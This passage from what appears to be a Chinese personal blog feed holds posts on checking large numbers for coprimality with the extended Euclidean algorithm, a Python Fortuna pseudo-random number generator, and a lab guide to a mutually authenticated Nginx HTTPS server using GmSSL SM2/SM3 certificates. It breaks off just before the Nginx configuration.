<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>使用Python利用扩展欧几里得算法求大数(超过长整型的数)是否互素，若不互素，则求出 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="4.654ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 2057 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(572,0)"><g data-mml-node="mo"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">、</text></g></g><g data-mml-node="mi" transform="translate(1572,0)"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g></g></g></svg></mjx-container> 使 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="20.863ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 9221.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(878,0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1672.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(2672.4,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(3272.4,0)"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(4035.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(5091,0)"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(5568,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(6001,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(6521,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(6910,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(7788,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(8232.7,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(8832.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，其中 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="5.606ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 2478 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(878,0)"><g data-mml-node="mo"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">、</text></g></g><g data-mml-node="mi" transform="translate(1878,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container> 为大数，且 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.09ex;" xmlns="http://www.w3.org/2000/svg" width="6.361ex" height="1.312ex" role="img" focusable="false" viewBox="0 -540 2811.6 580"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1155.8,0)"><path data-c="3E" d="M84 520Q84 528 88 533T96 539L99 540Q106 540 253 471T544 334L687 265Q694 260 694 250T687 235Q685 233 395 96L107 -40H101Q83 -38 83 -20Q83 -19 83 -17Q82 -10 98 -1Q117 9 248 71Q326 108 378 132L626 250L378 368Q90 504 86 509Q84 513 84 520Z"></path></g><g data-mml-node="mi" transform="translate(2211.6,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container> . </p>
<h1 id="程序运行结果"><a href="#程序运行结果" class="headerlink" title="程序运行结果"></a>程序运行结果</h1><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200420171514.png"></p>
<h1 id="程序源代码"><a href="#程序源代码" class="headerlink" title="程序源代码"></a>程序源代码</h1><p><a href="https://github.com/Leeyuxun/Large-Number-GCD">https://github.com/Leeyuxun/Large-Number-GCD</a></p>
]]></content>
      <categories>
        <category>personal tools</category>
      </categories>
      <tags>
        <tag>Large Number</tag>
        <tag>扩展欧几里得算法</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>利用Fortuna算法生成伪随机数</title>
    <url>/%E5%88%A9%E7%94%A8Fortuna%E7%AE%97%E6%B3%95%E7%94%9F%E6%88%90%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0.html</url>
    <content><![CDATA[<h1 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h1><p>通过python利用Fortuna算法生成伪随机数。<span id="more"></span></p>
<h1 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h1><ul>
<li><p>编程语言：Python 2.7</p>
</li>
<li><p>运行系统：Ubuntu 18.04</p>
</li>
<li><p>随机源</p>
<p>选取Linux系统下的<code>/dev/random</code>作为随机源；</p>
<p><code>/dev/random</code>是Linux内核下的设备文件，用于记录环境噪声，常用于生成随机数</p>
<p>参考：<a href="https://zh.wikipedia.org/wiki//dev/random">https://zh.wikipedia.org/wiki//dev/random</a></p>
</li>
<li><p>共设计四个文件，其作用如下</p>
<ol>
<li><p><code>generator.py</code>，用作发生器</p>
<p>包含函数如下：</p>
<ol>
<li><code>reseed(seed)</code>，用于重新生成种子，seed为上一次生成随机数后的种子</li>
<li><code>set_key(key)</code>，用于生成新的密钥，kay为旧密钥</li>
<li><code>generate_blocks(n)</code>，分组，用于生成AES加密数据块，n为分组数目，返回16n字节的随机字符串</li>
<li><code>pseudo_random_data(n)</code>，用于生成随机数据，n为要生成随机数据的字节数，返回n字节随机数据</li>
</ol>
<p>使用<code>pyan &amp;&amp; Graphviz</code>生成<code>generator.py</code>文件下的函数之间的调用关系如下：</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200419174452.png"></p>
</li>
<li><p><code>accumulator.py</code>，用作累加器</p>
<p>包含函数如下：</p>
<ol>
<li><code>random_data(n)</code>，用于生成伪随机数，n表示要生成伪随机数的字节数</li>
<li><code>add_random_event(s,i,e)</code>，用于加入随机事件，当随机源有另外一个随机事件时，就调用此函数，s表示源编号范围，i表示赤字编号范围，e表示时间数据</li>
</ol>
<p>使用<code>pyan &amp;&amp; Graphviz</code>生成<code>accumulator.py</code>文件下的函数之间的调用关系如下：</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200419175455.png"></p>
</li>
<li><p><code>seedcreator.py</code>，用于种子文件管理，生成和更新种子文件</p>
<p>包含函数如下：</p>
<ol>
<li><code>seed_update(accumulator)</code>，用于生成和更新种子文件</li>
</ol>
<p>使用<code>pyan &amp;&amp; Graphviz</code>生成<code>seedcreator.py</code>文件下的函数之间的调用关系如下：</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200419181544.png"></p>
</li>
<li><p><code>main.py</code>，调用并整合上述三个文件，构成Fortuna伪随机数生成器</p>
<p>包含函数如下：</p>
<ol>
<li><code>main()</code>，用做输入输出接口，接收输入的生成的随机数的字节数目，调用其他函数生成并输出随机数；</li>
</ol>
</li>
</ol>
</li>
<li><p>利用 <code>pycallgraph</code>生成项目的动态调用图如下，符合设计</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200419184839.png"></p>
</li>
</ul>
<h1 id="程序运行结果"><a href="#程序运行结果" class="headerlink" title="程序运行结果"></a>程序运行结果</h1><p>程序运行结果如下，输出随机数的字节码，每次程序调用都会重新生成种子文件，实现了Fortuna算法的随机数生成。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200419190414.png"></p>
<h1 id="程序源代码"><a href="#程序源代码" class="headerlink" title="程序源代码"></a>程序源代码</h1><p><a href="https://github.com/Leeyuxun/PyFortuna">https://github.com/Leeyuxun/PyFortuna</a></p>
]]></content>
      <categories>
        <category>personal tools</category>
      </categories>
      <tags>
        <tag>Fortuna</tag>
        <tag>Pseudo-random number</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>基于国密搭建双向认证Web服务器</title>
    <url>/%E5%9F%BA%E4%BA%8E%E5%9B%BD%E5%AF%86%E6%90%AD%E5%BB%BA%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81Web%E6%9C%8D%E5%8A%A1%E5%99%A8.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><ol>
<li>搭建一个Web服务器；</li>
<li>配置https访问，并且支持双向认证访问，即客户端和服务器端均需要提供证书访问；</li>
<li>所有的证书需要使用国密算法；<span id="more"></span></li>
</ol>
<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="Ubuntu安装Nginx"><a href="#Ubuntu安装Nginx" class="headerlink" title="Ubuntu安装Nginx"></a>Ubuntu安装Nginx</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200514103205.png"></p>
<ul>
<li><p>Nginx相关命令</p>
<ul>
<li>启动<code>sudo systemctl start nginx</code></li>
<li>关闭<code>sudo systemctl stop nginx</code></li>
<li>重启<code>sudo systemctl restart nginx</code></li>
</ul>
</li>
<li><p>设置防火墙，保证局域网可以访问该web服务器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw app list</span><br><span class="line">sudo ufw allow <span class="string">'Nginx HTTP'</span></span><br><span class="line">sudo ufw allow <span class="string">'Nginx HTTPS'</span></span><br><span class="line">sudo ufw status</span><br></pre></td></tr></table></figure>

<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200514103652.png" style="zoom:67%;">

<p>局域网下另一台机器可以进行访问</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200514104000.png"></p>
</li>
</ul>
<h3 id="HTTPS双向认证分析"><a href="#HTTPS双向认证分析" class="headerlink" title="HTTPS双向认证分析"></a>HTTPS双向认证分析</h3><ol>
<li><p>HTTPS单向认证流程</p>
<p>单向认证流程中，服务器端保存着公钥证书和私钥两个文件，整个握手过程如下：</p>
<ol>
<li>客户端发起建立HTTPS连接请求，将SSL协议版本的信息发送给服务器端；</li>
<li>服务器端将本机的公钥证书server.crt发送给客户端；</li>
<li>客户端读取公钥证书server.crt，取出了服务端公钥；</li>
<li>客户端生成一个随机数密钥R，用刚才得到的服务器公钥去加密这个随机数形成密文，发送给服务端；</li>
<li>服务端用自己的私钥server.key去解密这个密文，得到了密钥R；</li>
<li>服务端和客户端在后续通讯过程中就使用这个密钥R进行通信；</li>
</ol>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200514100800.png"></p>
</li>
<li><p>HTTPS双向认证流程</p>
<p>双认证流程握手过程如下：</p>
<ol>
<li>客户端发起建立HTTPS连接请求，将SSL协议版本的信息发送给服务端；</li>
<li>服务器端将本机的公钥证书server.crt发送给客户端；</li>
<li>客户端读取公钥证书server.crt，取出了服务端公钥；</li>
<li>客户端将客户端公钥证书client.crt发送给服务器端；</li>
<li>服务器端解密客户端公钥证书，拿到客户端公钥；</li>
<li>客户端发送自己支持的加密方案给服务器端；</li>
<li>服务器端根据自己和客户端的能力，选择一个双方都能接受的加密方案，使用客户端的公钥加密后发送给客户端；</li>
<li>客户端使用自己的私钥解密加密方案，生成一个随机数R，使用服务器公钥加密后传给服务器端；</li>
<li>服务端用自己的私钥去解密这个密文，得到了密钥R；</li>
<li>服务端和客户端在后续通讯过程中就使用这个密钥R进行通信；</li>
</ol>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200515014435.png"></p>
</li>
</ol>
<h3 id="利用国密生成证书"><a href="#利用国密生成证书" class="headerlink" title="利用国密生成证书"></a>利用国密生成证书</h3><p>如果要把整个双向认证的流程跑通，最终需要4个证书文件：</p>
<ol>
<li>服务器端公钥证书：server.crt</li>
<li>服务器端私钥文件：server.key</li>
<li>客户端公钥证书：client.crt</li>
<li>客户端私钥文件：client.key</li>
</ol>
<p>生成这一系列证书之前，需要先生成一个CA根证书，然后由这个CA根证书颁发服务器公钥证书和客户端公钥证书；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200513223122.png"></p>
<p>全程使用GmSSL来生成一系列的自签名证书，自签名证书没有经过证书机构的认证，很多浏览器会认为不安全，但用来实验是足够的。</p>
<ul>
<li><p>安装GmSSL</p>
<ol>
<li><p>下载<a href="https://github.com/guanzhi/GmSSL/archive/master.zip">源代码</a>并解压</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo unzip GmSSL-master.zip</span><br></pre></td></tr></table></figure></li>
<li><p>编译安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./config no-saf no-sdf no-skf no-sof no-zuc</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure></li>
<li><p>执行<code>gmssl</code>命令行工具检查安装成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gmssl version</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200514162828.png"></p>
</li>
</ol>
</li>
</ul>
<h4 id="生成自签名根证书"><a href="#生成自签名根证书" class="headerlink" title="生成自签名根证书"></a>生成自签名根证书</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> /etc/nginx/keys/</span><br><span class="line"><span class="built_in">cd</span> /etc/nginx/keys/</span><br><span class="line"><span class="comment"># 利用SM2创建根证书私钥</span></span><br><span class="line">gmssl ecparam -genkey -name sm2p256v1 -out root.key</span><br><span class="line"><span class="comment"># 利用SM3创建根证书请求文件</span></span><br><span class="line">gmssl req -sm3 -new -out root.csr -key root.key</span><br><span class="line"><span class="comment"># 创建根证书</span></span><br><span class="line">gmssl x509 -req -<span class="keyword">in</span> root.csr -out root.crt -signkey root.key -CAcreateserial -days 3650</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200514163616.png"></p>
<p>经过上面的命令，可以得到一个签名有效期为10年的根证书root.crt，后续用这个根证书去颁发服务器证书和客户端证书。</p>
<p>证书中的pub与root.key是一致的，这样输出的root.crt中,包含了会话的公钥，用于分发加密。而最后的sm3的数字签名，用于通过上面的公钥来验证证书的完整性。</p>
<h4 id="生成自签名服务器端证书"><a href="#生成自签名服务器端证书" class="headerlink" title="生成自签名服务器端证书"></a>生成自签名服务器端证书</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 利用SM2生成服务器端证书私钥</span></span><br><span class="line">gmssl ecparam -genkey -name sm2p256v1 -out server.key</span><br><span class="line"><span class="comment"># 利用SM3生成服务器端证书请求文件</span></span><br><span class="line">gmssl req -sm3 -new -out server.csr -key server.key</span><br><span class="line"><span class="comment"># 生成服务器端公钥证书</span></span><br><span class="line">gmssl x509 -req -<span class="keyword">in</span> server.csr -out server.crt -signkey server.key -CA root.crt -CAkey root.key -CAcreateserial -days 3650</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200514165203.png"></p>
<p>经过上面命令得到：</p>
<ul>
<li>server.key：服务器端的秘钥文件</li>
<li>server.crt：有效期十年的服务器端公钥证书(使用根证书和服务器端私钥文件一起生成)</li>
</ul>
<h4 id="生成自签名客户端证书"><a href="#生成自签名客户端证书" class="headerlink" title="生成自签名客户端证书"></a>生成自签名客户端证书</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 利用SM2生成客户端证书私钥</span></span><br><span class="line">gmssl ecparam -genkey -name sm2p256v1 -out client.key</span><br><span class="line"><span class="comment"># 利用SM3生成客户端证书请求文件</span></span><br><span class="line">gmssl req -sm3 -new -out client.csr -key client.key</span><br><span class="line"><span class="comment"># 生成客户端公钥证书</span></span><br><span class="line">gmssl x509 -req -<span class="keyword">in</span> client.csr -out client.crt -signkey client.key -CA root.crt -CAkey root.key -CAcreateserial -days 3650</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200514171605.png"></p>
<p>经过上面的命令得到：</p>
<ul>
<li>client.key：客户端的私钥文件</li>
<li>client.crt：有效期十年的客户端证书(使用根证书和客户端私钥一起生成)</li>
</ul>
<h3 id="Nginx配置"><a href="#Nginx配置" class="headerlink" title="Nginx配置"></a>Nginx配置</h3><ol>
<li><p>创建Nginx配置文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/nginx/sites-enabled</span><br><span class="line">vim https.conf</span><br></pre></td></tr></table></figure>

<p>配置文件如下：</p>
